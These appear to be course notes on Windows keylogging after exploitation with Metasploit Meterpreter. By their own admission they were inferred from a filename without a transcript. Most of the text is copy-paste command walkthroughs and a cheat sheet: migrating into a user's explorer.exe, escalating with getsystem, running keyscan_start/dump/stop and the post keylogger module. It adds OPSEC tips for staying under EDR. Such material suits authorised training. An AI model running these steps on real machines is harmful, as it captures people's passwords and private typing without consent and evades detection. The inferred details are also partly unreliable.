# 19 - Windows Keylogging (Windows Post-Exploitation)

Note: No transcript was provided. The following is a conservative, exam-focused summary inferred from the filename and the “04-WindowsPostExploitation” module. Commands and module names are standard for Metasploit/Meterpreter but may vary slightly by version—verify with show options or help where noted.

## What the video covers (Introduction / big picture)
- Why keylogging is useful in Windows post-exploitation: capturing passwords, secrets, and activity typed by an interactive user.
- How to reliably capture keystrokes using Meterpreter on a Windows target.
- Requirements and pitfalls: capturing from the correct user session/desktop, architecture and permissions, EDR/AV detections, and ethical/legal constraints.
- Two common approaches:
  - Interactive Meterpreter keyscan commands (keyscan_start/dump/stop).
  - Metasploit post module for automated collection and saved loot.

## Flow (ordered)
1. Obtain a Meterpreter session on the Windows target.
2. Confirm OS/arch and who you’re running as; identify an interactive user session.
3. Migrate Meterpreter into a GUI process owned by the target user (commonly explorer.exe) and, on x64 systems, into a 64-bit process.
4. Start the keylogger (keyscan_start) and optionally enable msfconsole spool to save output.
5. Periodically dump captured keystrokes (keyscan_dump) or use the post keylogger module to automate capture and save to loot.
6. Stop the keylogger (keyscan_stop), clean up, and verify nothing is left on disk.
7. Optional: complement with screenshot/clipboard capture for context.

## Tools highlighted
- Metasploit Framework (msfconsole)
- Meterpreter (Windows stdapi keyscan functionality)
- Metasploit post module: search type:post platform:windows keylog (e.g., post/windows/capture/keylogger)
- msfconsole spool (to save console output to a file)

## Typical command walkthrough (detailed, copy-paste friendly)

Assumes you already have a Meterpreter session on the target.

### 1) Identify session, arch, and user
```
msfconsole -q
sessions
sessions -i 1
sysinfo
getuid
```

- If you are not the interactive user or you’re in Session 0 (service), migrate to the target user’s desktop process.

### 2) Enumerate processes and migrate into the user’s explorer.exe
```
ps
```
- Find the explorer.exe that belongs to the logged-in target user and note its PID (e.g., 3120). Prefer a 64-bit process on x64 Windows.

```
migrate 3120
getuid
sysinfo
```

- If migration fails due to permissions, try elevating:
```
getsystem
ps
migrate 3120
```

### 3) Start keylogger, capture, and dump
Optionally enable spool to save all console output to a file on your attack box:
```
background
spool ~/windows_keylog.txt
sessions -i 1
```

Start keylogging:
```
keyscan_start
```

Let the user type for a while (browse, log in to apps, etc.), then dump:
```
keyscan_dump
```

Repeat dumps as needed, then stop:
```
keyscan_stop
```

Stop spooling if you enabled it:
```
background
spool off
sessions -i 1
```

### 4) Automated capture with a Metasploit post module
If you prefer an automated loop that saves to loot:

```
background
search type:post platform:windows keylog
use post/windows/capture/keylogger
show options
set SESSION 1
run
```

- Review output and loot path in msfconsole. Loot typically saves under: ~/.msf4/loot/

Tip: The show options output will reveal additional flags (e.g., duration/poll interval if supported by your MSF version).

## Practical tips
- Session/desktop matters: keyscan only captures keys from the desktop your Meterpreter is running in. If your session is in Session 0 or under a service account, migrate into the user’s GUI process (explorer.exe) to capture that user’s keystrokes.
- Architecture matters: on x64 Windows, use a 64-bit Meterpreter or migrate into a 64-bit process for best results across modern GUI apps.
- Privileges: if migration to explorer.exe fails, elevate first (getsystem) or find another user-owned GUI process you can migrate into.
- Limitations:
  - UAC secure desktop, lock screen, and credential providers often run on separate desktops; keyscan won’t capture those.
  - RDP users run in separate sessions. Migrate into the RDP user’s explorer.exe in that session.
- OPSEC:
  - Keylogging is noisy and can be detected by EDR. Keep capture windows short and targeted.
  - Avoid writing any keylogger binaries to disk; Meterpreter’s keyscan is in-memory.
  - Always stop and clean up (keyscan_stop; end spool).
- Evidence handling: use msfconsole spool to capture dumps to your notes, and annotate times and context for later reporting.
- Troubleshooting:
  - If keyscan_dump shows nothing, verify you’re in the correct session and the user is actively typing.
  - If the session becomes unstable after migration, pick a different stable GUI process (explorer.exe, notepad.exe) and re-run keyscan.

## Minimal cheat sheet (one-screen flow)
```
# 1) Attach to the session
sessions
sessions -i <ID>
sysinfo
getuid

# 2) Migrate into the interactive user's explorer.exe (use ps to find PID)
ps
migrate <PID_of_explorer.exe>

# 3) Optional: log console output to a file on attacker box
background
spool ~/windows_keylog.txt
sessions -i <ID>

# 4) Keylog: start -> dump -> stop
keyscan_start
# wait while user types
keyscan_dump
keyscan_stop

# 5) Stop spooling and clean up
background
spool off

# Alternative: automated post module
search type:post platform:windows keylog
use post/windows/capture/keylogger
set SESSION <ID>
run
```

## Summary
This lesson demonstrates Windows keylogging as a post-exploitation technique using Meterpreter. The key to reliable capture is running inside the correct user’s interactive desktop session (often by migrating to their explorer.exe), matching architecture on x64 systems, and keeping the capture targeted and short for OPSEC. Use the Meterpreter keyscan commands for quick, ad-hoc keylogging, or the Metasploit post keylogger module to automate collection and save results to loot. Always stop the keylogger and avoid leaving artifacts on disk.